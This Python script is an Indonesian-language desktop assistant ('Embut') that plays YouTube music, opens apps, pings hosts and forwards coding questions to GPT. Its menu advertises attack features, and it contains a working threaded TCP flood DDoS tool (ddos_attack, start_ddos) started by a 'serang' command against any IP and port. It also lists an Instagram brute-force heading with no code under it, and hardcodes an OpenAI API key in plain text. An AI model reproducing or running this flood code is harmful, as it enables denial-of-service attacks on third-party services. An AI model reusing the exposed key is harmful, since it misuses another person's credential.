import os
import re
import webbrowser
import datetime
import openai
import pyttsx3
import yt_dlp
import vlc
import socket
import threading
import random
import time
import requests
import sys
import platform
import subprocess
import speech_recognition as sr
from optparse import OptionParser
from colorama import init, Fore, Style

openai.api_key = "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"

# Inisialisasi suara
engine = pyttsx3.init()
engine.setProperty('rate', 160)
player = None

def ngomong(text):
    print(f"🐱 Embut: {text}")
    engine.say(text)
    engine.runAndWait()

def hear_the_sound():
    r = sr.Recognizer()
    with sr.Microphone() as source:
        print("Listening...")
        audio = r.listen(source)
        try:
            order = r.recognize_google(audio, language="id-ID")
            print(f"> (Suara) {order}")
            return order.lower()
        except:
            ngomong("SORRY CAN YOU SAY A LITTLE CLEARER PLEASE")
            return ""

def buka_aplikasi(name):
    if name == "chrome":
        os.system("start chrome")
        ngomong("Chrome terbuka")
    elif name == "notepad":
        os.system("start notepad")
        ngomong("Notepad terbuka")
    else:
        ngomong("Aplikasi tidak dikenali")

def bantu_ngoding(perintah):
    try:
        response = openai.ChatCompletion.create(
            model="gpt-3.5-turbo",
            messages=[
                {"role": "system", "content": "Kamu adalah asisten coding pintar."},
                {"role": "user", "content": perintah}
            ]
        )
        jawaban = response["choices"][0]["message"]["content"]
        ngomong("Ini jawabannya...")
        print(jawaban)
        ngomong(jawaban[:100])
    except Exception as e:
        print(f"⚠️ Gagal ambil jawaban dari Embut: {e}")

def play_lagu(judul):
    global player

    if not judul:
        ngomong("Judul lagunya nggak boleh kosong.")
        return

    try:
        # Set path VLC (Windows)
        vlc_path = r"C:\Program Files\VideoLAN\VLC\vlc.exe"
        os.environ["PATH"] += os.pathsep + os.path.dirname(vlc_path)

        # Opsi buat YouTube-dl
        ydl_opts = {
            'format': 'bestaudio/best',
            'quiet': True,
            'default_search': 'ytsearch1',
            'nocheckcertificate': True,
        }

        with yt_dlp.YoutubeDL(ydl_opts) as ydl:
            info = ydl.extract_info(judul, download=False)
            if 'entries' in info:
                stream_url = info['entries'][0]['url']
            else:
                stream_url = info['url']

        ngomong(f"Muterin lagu: {judul} langsung dari YouTube...")

        # Mainin lagu pakai VLC
        instance = vlc.Instance()
        player = instance.media_player_new()
        media = instance.media_new(stream_url)
        player.set_media(media)
        player.play()

        time.sleep(1)  # Kasih waktu dikit buat mulai play

    except Exception as e:
        ngomong(f"⚠️ Gagal muter lagu: {str(e)}")
def pause_lagu():
    global player
    if player:
        player.pause()
        ngomong("Lagu dijeda")
    else:
        ngomong("Belum ada lagu yang diputar")

def stop_lagu():
    global player
    if player:
        player.stop()
        ngomong("Lagu dihentikan")
        player = None
    else:
        ngomong("Tidak ada lagu yang sedang diputar")

def log_aktivitas(command):
    waktu_sekarang = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with open("log.txt", "a") as file:
        file.write(f"[{waktu_sekarang}] {command}\n")


#Warna terminal (bisa disesuaikan)
R = "\033[91m"
G = "\033[92m"
Y = "\033[93m"
C = "\033[96m"
W = "\033[0m"

# Fungsi serangan TCP flood DDoS
def ddos_attack(ip, port):
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.5)
            s.connect((ip, port))
            packet = random._urandom(1024)  # paket acak 1024 bytes
            s.send(packet)
            print(R + f"[+] Packet sent to {ip}:{port}" + W)
            s.close()
        except Exception as e:
            print(Y + f"[!] Error: {e}" + W)

def start_ddos(ip, port, threads):
    print(G + f"Mulai serangan ke {ip}:{port} dengan {threads} thread..." + W)
    for _ in range(threads):
        t = threading.Thread(target=ddos_attack, args=(ip, port))
        t.daemon = True
        t.start()

def cek_ping_ip(ip_address):
    print(f"\n=== PING KE {ip_address} ===")
    try:
        # Cek ping
        if platform.system().lower() == "windows":
            ping_cmd = ["ping", "-n", "4", ip_address]
        else:
            ping_cmd = ["ping", "-c", "4", ip_address]

        result = subprocess.run(ping_cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

        if result.returncode == 0:
            print("[✓] Ping berhasil!")
            print(result.stdout)

            match = re.search(r'rtt min/avg/max/mdev = .*/(.*?)/', result.stdout)
            if match:
                print(f"\n[✓] Rata-rata latency: {match.group(1)} ms")

            match_win = re.search(r'Average = (\d+ms)', result.stdout)
            if match_win:
                print(f"\n[✓] Rata-rata latency: {match_win.group(1)}")
        else:
            print("[!] Gagal ping.")
            print(result.stderr)

    except Exception as e:
        print(f"[!] Error saat ping: {e}")

def tampilkan_menu():
    print(Fore.YELLOW + "===================== 📜 SCRIP BY YIRUM4 ===========================\n")
    
    print(Fore.MAGENTA + "🎵 MUSIK")
    print(Fore.LIGHTGREEN_EX + "  ▶ play [judul lagu]" + Fore.WHITE + "         ➜ Muterin lagu langsung dari YouTube")
    print(Fore.LIGHTGREEN_EX + "  ⏸ pause" + Fore.WHITE + "                    ➜ Jeda lagu yang sedang diputar")
    print(Fore.LIGHTGREEN_EX + "  ⏹ stop" + Fore.WHITE + "                     ➜ Hentikan lagu yang sedang diputar\n")
    
    print(Fore.MAGENTA + "🌐 APLIKASI")
    print(Fore.LIGHTGREEN_EX + "  🌍 buka chrome" + Fore.WHITE + "              ➜ Buka Google Chrome")
    print(Fore.LIGHTGREEN_EX + "  📄 buka notepad" + Fore.WHITE + "             ➜ Buka Notepad\n")

    print(Fore.MAGENTA + "⚔️ ATTACK & NETWORK")
    print(Fore.LIGHTGREEN_EX + "  💣 serang [ip] [port] [threads]" + Fore.WHITE + " ➜ Mulai serangan DDoS TCP Flood")
    print(Fore.LIGHTGREEN_EX + "  🔍 cekip [domain]" + Fore.WHITE + "           ➜ Cek IP dan port dari domain")
    print(Fore.LIGHTGREEN_EX + "  📡 cekping [ip/domain]" + Fore.WHITE + "      ➜ Cek koneksi (ping)\n")

    print(Fore.MAGENTA + "🤡 HACKING (Brute Force Instagram)")
    

    print(Fore.MAGENTA + "🤖 AI CODING")
    print(Fore.LIGHTGREEN_EX + "  💬 tanya [perintah]" + Fore.WHITE + "         ➜ Nanya soal coding ke GPT\n")

    print(Fore.MAGENTA + "🗣️ INPUT MODE")
    print(Fore.LIGHTGREEN_EX + "  🎙️ suara" + Fore.WHITE + "                   ➜ Gunakan perintah suara")
    print(Fore.LIGHTGREEN_EX + "  ⌨️ ketik" + Fore.WHITE + "                   ➜ Gunakan perintah ketikan\n")

    print(Fore.MAGENTA + "🔧 LAINNYA")
    print(Fore.LIGHTGREEN_EX + "  📋 menu" + Fore.WHITE + "                    ➜ Tampilkan menu ini lagi")
    print(Fore.LIGHTGREEN_EX + "  🧹 clear" + Fore.WHITE + "                   ➜ Bersihkan layar")
    print(Fore.LIGHTGREEN_EX + "  ❌ exit" + Fore.WHITE + "                    ➜ Keluar dari Embut\n")

    print(Fore.YELLOW + "===================================================================\n")


def proses_perintah(perintah):
    log_aktivitas(perintah)  # Logging aktivitas

    if perintah.startswith("buka "):
        app = perintah[5:]
        buka_aplikasi(app)

    elif perintah.startswith("tanya "):
        prompt = perintah[6:]
        bantu_ngoding(prompt)

    elif perintah.startswith("play "):
        judul = perintah[5:]
        play_lagu(judul)

    elif perintah == "pause":
        pause_lagu()

    elif perintah == "stop":
        stop_lagu()

    elif perintah == "menu":
        tampilkan_menu()

    elif perintah == "clear":
        os.system('cls' if os.name == 'nt' else 'clear')

    elif perintah.startswith("serang "):
        parts = perintah.split()
        if len(parts) < 2:
            ngomong("Format serang: serang [ip] [port] [threads]")
            return

        ip = parts[1]
        port = int(parts[2]) if len(parts) > 2 else 80
        threads = int(parts[3]) if len(parts) > 3 else 100

        try:
            ip = socket.gethostbyname(ip)
        except:
            ngomong("Gagal resolve IP")
            return

        start_ddos(ip, port, threads)

    elif perintah.startswith("cekip "):
        domain = perintah[6:]
        try:
            ip = socket.gethostbyname(domain)
            ngomong(f"IP dari {domain} adalah {ip}")
            print("Port umum: 80 (HTTP), 443 (HTTPS)")
        except Exception as e:
            ngomong(f"Gagal resolve IP: {e}")

    elif perintah.startswith("cekping"):
        parts = perintah.split()
        target = parts[1] if len(parts) > 1 else "8.8.8.8"

        try:
            ip = socket.gethostbyname(target)
            cek_ping_ip(ip)
        except Exception as e:
            ngomong(f"Gagal resolve IP dari {target}: {e}")

    elif perintah == "exit":
        ngomong("Sampai jumpa Putra!")
        exit()

    else:
        ngomong("Perintah tidak dikenali.")


init(autoreset=True)  

def main():
    ngomong("Halo, gue Embut. Mau ketik atau ngomong?")
    tampilkan_menu()
    
    while True:
        mode = input(Fore.LIGHTCYAN_EX + "Ketik [suara] atau [ketik]: ").lower()
        
        if mode == "suara":
            command = hear_the_sound()
        
        elif mode == "ketik":
            waktu = datetime.datetime.now().strftime("%H:%M")
            prompt = f"\033[92m[{waktu}] > \033[0m"
            command = input(prompt).lower()
        
        else:
            ngomong("Pilihannya cuma [suara] atau [ketik]")
            continue

        if command:
            proses_perintah(command)

if __name__ == "__main__":
    main()
